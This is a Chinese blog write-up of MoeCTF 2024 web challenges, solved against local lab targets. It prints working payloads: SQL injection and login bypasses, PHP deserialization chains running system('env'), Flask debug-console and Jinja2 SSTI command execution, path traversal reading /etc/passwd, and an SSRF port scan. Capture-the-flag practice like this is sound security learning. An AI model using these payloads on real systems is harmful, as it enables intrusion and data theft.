+++
title = "MoeCTF2024"
slug = "moectf2024"
description = ""
date = "2024-10-05T18:46:20"
lastmod = "2024-10-05T18:46:20"
image = ""
license = ""
categories = ["赛题"]
tags = []
+++

# 0x01 前言

赶紧来看看

# 0x02 question

## ez_http

抓不到包，直接看吧

```
http://127.0.0.1:57206/?xt=大帅b

POST ；
imoau=sb
Referer:https://www.xidian.edu.cn/
X-Forwarded-For:127.0.0.1
Cookie:user=admin
User-Agent:MoeDedicatedBrowser
```

## Web渗透测试与审计入门指北

直接搭建网站即可

## **弗拉格之地的入口**

访问`/robots.txt`

## **垫刀之路01: MoeCTF？启动！**

`env`即可

## **Moectf 2024 Web 调查问卷**

填写问卷就可以了

## **ProveYourLove**

表白三百次

```python
import requests
import time
# 定义目标URL
url = "http://127.0.0.1:51843/questionnaire"

# 定义请求头
headers = {
    "Content-Length": "129",
    "sec-ch-ua-platform": "Windows",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Origin": "http://127.0.0.1:51843",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://127.0.0.1:51843/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Connection": "close"
}

# 定义请求体
data = {
    "nickname": "baozongwi",
    "user_gender": "male",
    "target": "admin",
    "target_gender": "female",
    "message": "我爱你",
    "anonymous": "false"
}

# 发送POST请求
for i in range(310):
    response = requests.post(url, headers=headers, json=data)
    time.sleep(0.1)
    # 打印响应状态码和内容
    print(f"Status Code: {response.status_code}")
    print(f"Response Content: {response.text}")
```

## **弗拉格之地的挑战**

```
<!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下-->
<!--flag1: bW9lY3Rm-->
<!--下一步：/flag2hh.php-->
```

抓包发现第二个界面

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 05 Oct 2024 05:08:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.3.22
flag2: e0FmdEV
nextpage: /flag3cad.php
Content-Length: 361
```

发包得到第三段

```
POST /flag3cad.php?a=1 HTTP/1.1
Host: 127.0.0.1:54389
Content-Length: 3
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Origin: http://127.0.0.1:54389
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:54389/flag3cad.php?a=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: verify=user
Connection: close

b=2
```

```
flag3: yX3RoMXN
```

然后加个这个才能过

```
Referer:http://localhost:8080/flag3cad.php?a=1
```

查看源码

```
var buttons = document.getElementById("scope").getElementsByTagName("button");
    for (var i = 0; i < buttons.length; i++) {
        buttons[i].id = i + 1;
    }
    function start() {
        document.getElementById("num").innerText = "9";
    }
    function getID(button) {
        if (button.id == 9) {
            alert("你过关！（铜人震声）\n我们使用 console.log 来为你生成 flag");
            fetch('flag4bbc.php', {
                method: 'post',
                body: 'method=get',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            }).then((data) => {
                return data.json();
            }).then((result) => {
				console.log(result.hint);
                console.log(result.fll);
                console.log(result.goto)
            });
        } else {
            alert("该罚！(头部碰撞声)")
        }
    }
```

这里我们要添加一个按钮

```html
<div id="scope">
    <button onclick="getID(this)" id="1">1</button>
    <button onclick="getID(this)" id="2">2</button>
    <button onclick="getID(this)" id="3">3</button>
    <button onclick="getID(this)" id="4">4</button>
    <button onclick="getID(this)" id="5">5</button>
    <button onclick="getID(this)" id="6">6</button>
    <button onclick="getID(this)" id="7">7</button>
    <button onclick="getID(this)" id="8">8</button>
    <button onclick="getID(this)" id="9">9</button>
</div>
```

拿到

```
恭喜你！你已经知道，前端的一切都是可以更改的！
flag4bbc.php:41 flag4: fdFVUMHJ
flag4bbc.php:42 前往：/flag5sxr.php
```

然后POST一个

```
content=I want flag
```

```
flag5: fSV90aDF
```

```php
<?php
highlight_file("flag6diw.php");
if (isset($_GET['moe']) && $_POST['moe']) {
    if (preg_match('/flag/', $_GET['moe'])) {
        die("no");
    } elseif (preg_match('/flag/i', $_GET['moe'])) {
        echo "flag6: xxx";
    }
}
```

看不到东西在哪里，奇怪，反斜杠引号绕过也不行，再试试直接大小写绕过了

```
?moe=FLAG
POST:
moe=FLAG
```

```
flag6: rZV9VX2t
```

后面直接执行命令

```
rbm93X1dlQn0=
```

```
bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=
```

解码即可

## **ImageCloud前置**

直接用协议读取

## **垫刀之路02: 普通的文件上传**

上传之后找了一下，最后在环境变量里面

## **垫刀之路03: 这是一个图床**

和02没啥区别，难道我02就是非预期？

## **垫刀之路05: 登陆网站**

先爆破了一下发现不行，然后弱密码欧克

```
username='='
password='='
```

## **垫刀之路06: pop base mini moe**

```php
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil;

    // 如何赋值呢
    private $a;

    function __destruct() {
        $s = $this->a;
        $s($this->evil);
    }
}

class B {
    private $b;

    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}


 if(isset($_GET['data']))
 {
     $a = unserialize($_GET['data']);
 }
 else {
     highlight_file(__FILE__);
 }
```

直接`public`就行了

```php
<?php

class A {
    // 注意 private 属性的序列化哦
    public $evil;

    // 如何赋值呢
    public $a;
}
$a=new A();
$a->a="system";
$a->evil="env";
echo urlencode(serialize($a));
```

## **垫刀之路07: 泄漏的密码**

访问`/console`，然后RCE

```
import os
>>> print(os.popen('tac /f*').read())
远在天边，近在眼前啊
>>> print(os.popen('ls').read())
__pycache__
app.py
flag
getPIN.py
static
templates

>>> print(os.popen('tac f*').read())
moectf{Dont_usiNG-FlaSk_6y-dEBuG-mOD-4nd-I3AK_yOUR-P1N17}
```

## **垫刀之路04: 一个文件浏览器**

```
http://127.0.0.1:61013/?path=../../../../etc/passwd
```

任意文件读取了，直接读

```
http://127.0.0.1:61013/?path=../../../../tmp/flag
```

## **静态网页**

使用bp爬取一下，然后在api接口里面发现这玩意

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 05 Oct 2024 07:03:17 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.3.22
Content-Length: 3012

{
    "version": "1.0.0",
    "model": "../model/Potion-Maker/Pio/model.moc",
    "textures": [
        "../model/Potion-Maker/Pio/textures/school-2017-costume-yellow.png"
    ],
    "layout": {
        "center_x": 0,
        "center_y": -0.05,
        "width": 2
    },
    "hit_areas_custom": {
        "head_x": [
            -0.35,
            0.6
        ],
        "head_y": [
            0.19,
            -0.2
        ],
        "body_x": [
            -0.3,
            -0.25
        ],
        "body_y": [
            0.3,
            -0.9
        ]
    },
    "motions": {
        "idle": [
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath1.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath2.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath3.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath5.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath7.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Breath8.mtn"
            }
        ],
        "sleepy": [
            {
                "file": "../model/Potion-Maker/Pio/motions/Sleeping.mtn"
            }
        ],
        "flick_head": [
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere1.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere2.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere3.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere4.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere5.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch Dere6.mtn"
            }
        ],
        "tap_body": [
            {
                "file": "../model/Potion-Maker/Pio/motions/Sukebei1.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Sukebei2.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Sukebei3.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch1.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch2.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch3.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch4.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch5.mtn"
            },
            {
                "file": "../model/Potion-Maker/Pio/motions/Touch6.mtn"
            }
        ]
    },
    "flag": "Please turn to final1l1l_challenge.php"
}
```

```php
<?php
highlight_file('final1l1l_challenge.php');
error_reporting(0);
include 'flag.php';

$a = $_GET['a'];
$b = $_POST['b'];
if (isset($a) && isset($b)) {
    if (!is_numeric($a) && !is_numeric($b)) {
        if ($a == 0 && md5($a) == $b[$a]) {
            echo $flag;
        } else {
            die('noooooooooooo');
        }
    } else {
        die( 'Notice the param type!');
    }
} else {
    die( 'Where is your param?');
}
```

想了一下就是要md5之后还是0e开头，下面再传0就可以了

```c++
QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a
```

```
?a=QNKCDZO
POST:
b=0%00
```

## **电院_Backend**

```php
<?php
error_reporting(0);
session_start();

if($_POST){
    $verify_code = $_POST['verify_code'];

    // 验证验证码
    if (empty($verify_code) || $verify_code !== $_SESSION['captcha_code']) {
        echo json_encode(array('status' => 0,'info' => '验证码错误啦，再输入吧'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $email = $_POST['email'];
    if(!preg_match("/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/", $email)||preg_match("/or/i", $email)){
        echo json_encode(array('status' => 0,'info' => '不存在邮箱为： '.$email.' 的管理员账号！'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $pwd = $_POST['pwd'];
    $pwd = md5($pwd);
    $conn = mysqli_connect("localhost","root","123456","xdsec",3306);


    $sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result);

    if($row){
        $_SESSION['admin_id'] = $row['id'];
        $_SESSION['admin_email'] = $row['email'];
        echo json_encode(array('status' => 1,'info' => '登陆成功，moectf{testflag}'));
    } else{
        echo json_encode(array('status' => 0,'info' => '管理员邮箱或密码错误'));
        unset($_SESSION['captcha_code']);
    }
}


?>
```

这么一看感觉像是sql注入

```sql
SELECT * FROM admin WHERE email='$email' AND pwd='$pwd';

1'<'2'-- and '1'<'2@1.1';
SELECT * FROM admin WHERE email='1'<'2'-- and '1'<'2@1.1';' AND pwd='1';
```

回到题目进行测试，拿到路由`/admin/`，由于有格式的检测所以只能这么写

不能有or而且要求了格式是基本的邮箱，还要维持一个等于

```sql
mysql> select '2@1.1';
+-------+
| 2@1.1 |
+-------+
| 2@1.1 |
+-------+
1 row in set (0.02 sec)

mysql> select '1'<'2@1.1';
+-------------+
| '1'<'2@1.1' |
+-------------+
|           1 |
+-------------+
1 row in set (0.03 sec)
```

## **pop moe**

```php
<?php

class class000 {
    private $payl0ad = 0;
    protected $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data']))
{
    $a = unserialize($_GET['data']);
}
else {
    highlight_file(__FILE__);
}
```

个人感觉挺绕的，我如果打`eval`那条链子只能打个`phpinfo`

如果是set那条的话可能能`getshell`

```
class002::dangerous->class003::evvval
```

不过并没有我想的那样，这里直接断了，所以应该还是只有一条链子

```
class000::destruct->class001::invoke->class002::set->class002::dangerous->class003::evvval
```

这样子就完整了，写个poc

```php
<?php

class class000 {
    public $payl0ad = 1;
    public $what;

}

class class001 {
    public $payl0ad;
    public $a;
}

class class002 {
    public $sec;

}

class class003 {
    public $mystr;
}
$a=new class000();
$a->what=new class001();
$a->what->payl0ad="dangerous";
$a->what->a=new class002();
$a->what->a->sec=new class003();
$a->what->a->sec->mystr="phpinfo();";
echo urlencode(serialize($a));
```

## **勇闯铜人阵**

这道题还是一个脚本题，挺有意思的

```python
import requests
from bs4 import BeautifulSoup
import re

def getKey(response):
    if response.status_code == 200:
        beautiful_soup = BeautifulSoup(response.text, "html.parser")
        key_text = beautiful_soup.find("h1", id="status")
        if key_text:
            print(key_text.text.strip())
            return key_text
        else:
            print("Error: No h1 element with id 'status' found.")
            print("Response text:")
            print(response.text)
    else:
        print(f"Error: Request failed with status code {response.status_code}")
        print("Response text:")
        print(response.text)
    return None

def parseNumbers(text):
    match = re.findall(r'(\d+)', text)
    number = [int(num) for num in match]
    if not number:
        print("Error: No numbers found in the text.")
        print("Text being parsed:")
        print(text)
    return number

def generateDirect(number):
    if len(number) == 1:
        return direct_dict[str(number[0])].replace("一个", "")
    elif len(number) == 2:
        return f"{direct_dict[str(number[0])]}，{direct_dict[str(number[1])]}"
    else:
        print("Error: Unexpected number of elements in the number list.")
        return ""

direct_dict = {
    "1": "北方一个",
    "2": "东北方一个",
    "3": "东方一个",
    "4": "东南方一个",
    "5": "南方一个",
    "6": "西南方一个",
    "7": "西方一个",
    "8": "西北方一个"
}

url = "http://127.0.0.1:56182/"
response = requests.get(url + "restart")
key_text = getKey(response)

if key_text:
    session = requests.session()
    data = {
        "player": "baozongwi",
        "direct": "弟子明白"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    print(data)
    response = session.post(url=url, data=data, headers=headers)

    for _ in range(100):
        r = getKey(response)
        if r is not None:
            if "该罚！(应声倒地)" in r.text:
                print("Error: Received penalty message. Stopping the loop.")
                break
            number = parseNumbers(r.text)
            if number:
                data['direct'] = generateDirect(number)
                print(data)
                response = session.post(url=url, data=data, headers=headers)
                if "moectf" in response.text:
                    print(response.text)
                    break
            else:
                break
        else:
            print("Error: Failed to get key text.")
            break
```

自己写的发现有点问题，和AI一起调整

## **Re: 从零开始的 XDU 教书生活**

你教书为什么要我AES加密服了

抄的一个师傅的脚本，我模块都没有所以flag也没有

```python
import requests
import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import time


def encrypt_by_aes(plaintext: str, key: str, iv: str) -> str:
    key_bytes = key.encode("utf-8")
    iv_bytes = iv.encode("utf-8")
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)

    # 将明文转为字节并进行填充（填充到块大小的倍数，通常是16字节）
    plaintext_bytes = pad(plaintext.encode("utf-8"), AES.block_size)

    # 加密
    encrypted_bytes = cipher.encrypt(plaintext_bytes)

    # 将加密后的字节进行 base64 编码
    encrypted = base64.b64encode(encrypted_bytes).decode("utf-8")

    return encrypted

key = "u2oh6Vu^HWe4_AES"
iv = "u2oh6Vu^HWe4_AES"





# 保存结果的文件名
output_file = "output1.txt"

# 读取保存的数据
with open(output_file, "r", encoding="utf-8") as file:
    lines = file.readlines()

# 循环遍历每一行数据
for line in lines:
    a = requests.session()

    url = 'http://127.0.0.1:35849/v2/apis/sign/refreshQRCode'

    b = a.get(url=url)
    print(b.text)
    # 提取signCode
    signCode = re.findall(r'"signCode":"(.*?)"', b.text)
    signCode = str(signCode)
    signCode = signCode.replace("'", "").replace("[", "").replace("]", "")

    # 提取enc值
    enc = re.findall(r'"enc":"(.*?)"', b.text)
    enc = str(enc)
    enc = enc.replace("'", "").replace("[", "").replace("]", "")

    print('signCode=', signCode)
    print('enc=', enc)

    number = line.strip()  # 去除行末尾的换行符
    plaintext = number
    encrypted_text = encrypt_by_aes(plaintext, key, iv)
    print('encrtpted==',encrypted_text)
    url1='http://127.0.0.1:35849/fanyalogin'
    data={
    "fid":-1,
    "uname":f"{encrypted_text}",
    "password":f"{encrypted_text}",
    "refer":"https%253A%252F%252Fi.chaoxing.com",
    "t":"true",
    "forbidotherlogin":0,
    "doubleFactorLogin":0,
    "independentId":0,
    "independentNameId":0
    }

    cookies = {
        "retainlogin": "1",
        "token": "f5ba764e-040a-400c-ae13-80fedd7caac6"
    }
    login1=requests.session()
    login = login1.post(url=url1,data=data)
    print("data注入",login)
    # print(login.cookies)
    cook = login.cookies
    print(cook)
    for cookie in cook:
        if cookie.name == "token":
            token_value = cookie.value #token值
            print(f"token={token_value}")
            cookies["token"]=token_value
            break  # 找到后就可以停止遍历
    print(cookies)

    url2 =f'http://127.0.0.1:35849/widget/sign/e?id=4000000000000&c={signCode}&enc={enc}&DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=id'
    login3s=requests.session()
    login3 = login3s.get(url=url2,cookies=cookies)
    print(login3)
    time.sleep(0.5)
```

## **who's blog?**

发现可以SSTI

```
?id={{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('env').read()}}
```

## **ImageCloud**

有张flag图片，但是里面好像也没有藏什么东西

app.py

```python
from flask import Flask, request, send_file, abort, redirect, url_for
import os
import requests
from io import BytesIO
from PIL import Image
import mimetypes
from werkzeug.utils import secure_filename

app = Flask(__name__)

UPLOAD_FOLDER = 'static/'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}

uploaded_files = []

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return '''
    <h1>图片上传</h1>
    <form method="post" enctype="multipart/form-data" action="/upload">
      <input type="file" name="file">
      <input type="submit" value="上传">
    </form>
    <h2>已上传的图片</h2>
    <ul>
    ''' + ''.join(
        f'<li><a href="/image?url=http://localhost:5000/static/{filename}">{filename}</a></li>'
        for filename in uploaded_files
    ) + '''
    </ul>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return '未找到文件部分', 400
    file = request.files['file']

    if file.filename == '':
        return '未选择文件', 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        ext = filename.rsplit('.', 1)[1].lower()

        unique_filename = f"{len(uploaded_files)}_{filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)

        file.save(filepath)
        uploaded_files.append(unique_filename)

        return redirect(url_for('index'))
    else:
        return '文件类型不支持', 400

@app.route('/image', methods=['GET'])
def load_image():
    url = request.args.get('url')
    if not url:
        return 'URL 参数缺失', 400

    try:
        response = requests.get(url)
        response.raise_for_status()
        img = Image.open(BytesIO(response.content))

        img_io = BytesIO()
        img.save(img_io, img.format)
        img_io.seek(0)
        return send_file(img_io, mimetype=img.get_format_mimetype())
    except Exception as e:
        return f"无法加载图片: {str(e)}", 400

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(host='0.0.0.0', port=5000)

```

app2.py

```python
from flask import Flask, request, send_file, abort, redirect, url_for
import os
import requests
from io import BytesIO
from PIL import Image
import mimetypes
from werkzeug.utils import secure_filename
import socket
import random

app = Flask(__name__)

UPLOAD_FOLDER = 'uploads/'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}

uploaded_files = []

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_mimetype(file_path):
    mime = mimetypes.guess_type(file_path)[0]
    if mime is None:
        try:
            with Image.open(file_path) as img:
                mime = img.get_format_mimetype()
        except Exception:
            mime = 'application/octet-stream'
    return mime

def find_free_port_in_range(start_port, end_port):
    while True:
        port = random.randint(start_port, end_port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', port))
        s.close()
        return port 

@app.route('/')
def index():
    return '''
    <h1>图片上传</h1>
    <form method="post" enctype="multipart/form-data" action="/upload">
      <input type="file" name="file">
      <input type="submit" value="上传">
    </form>
    <h2>已上传的图片</h2>
    <ul>
    ''' + ''.join(f'<li><a href="/image/{filename}">{filename}</a></li>' for filename in uploaded_files) + '''
    </ul>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return '未找到文件部分', 400
    file = request.files['file']

    if file.filename == '':
        return '未选择文件', 400
    if file and allowed_file(file.filename):

        filename = secure_filename(file.filename)
        ext = filename.rsplit('.', 1)[1].lower()

        unique_filename = f"{len(uploaded_files)}_{filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)

        file.save(filepath)
        uploaded_files.append(unique_filename)

        return redirect(url_for('index'))
    else:
        return '文件类型不支持', 400

@app.route('/image/<filename>', methods=['GET'])
def load_image(filename):
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        mime = get_mimetype(filepath)
        return send_file(filepath, mimetype=mime)
    else:
        return '文件未找到', 404

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    port = find_free_port_in_range(5001, 6000)
    app.run(host='0.0.0.0', port=port)

```

这两东西感觉没啥太大差别啊，不过这端口肯定是要扫描一下的，并且看个大概也知道，就是在扫描看看有没有文件，刚刚有个`flag.jpg`

本来是想着本地来直接看着打，结果一直跑脚本跑不出来

```python
import requests

url = "http://192.168.9.154:5124/image?url=http://127.0.0.1:{port}/image/flag.jpg"

# 遍历端口范围
for port in range(5001, 6001):
    try:
        url = url.format(port=port)
        # 发起请求
        response = requests.get(url, timeout=5)
        print(port)
        if "无法加载图片" not in response.text:
            print(f"成功连接到端口 {port}")
            print(response.text)
            break
    except requests.exceptions.RequestException as e:
        print(f"连接到端口 {port} 失败: {e}")
```

后面知道说是不用开本地服务，不然靶机有啥用(~~说的也是~~)。用bp爆破一下就可以了

```
/image?url=http://localhost:5133/image/flag.jpg
```

## **PetStore**

pickle反序列化，不会也，但是这个可以等后面会了来

## **smbms**

貌似是一个Java的sql，不会

# 0x03 小结

说实话有些东西，还是没接触过，特别是铜人那个脚本，自己代码能力还是不行，感觉更加动手，平台很流程好用
